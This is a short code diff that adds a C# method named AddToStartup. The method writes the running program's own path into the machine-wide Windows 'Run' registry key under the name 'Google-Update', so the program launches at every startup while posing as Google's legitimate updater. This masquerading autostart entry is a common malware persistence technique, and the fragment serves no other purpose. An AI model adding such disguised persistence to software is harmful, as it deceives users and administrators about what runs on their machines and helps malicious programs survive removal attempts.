@@ -1,0 +1,5 @@
+static void AddToStartup()
+        {
+            RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
+            key.SetValue("Google-Update", Application.ExecutablePath.ToString());
+        }
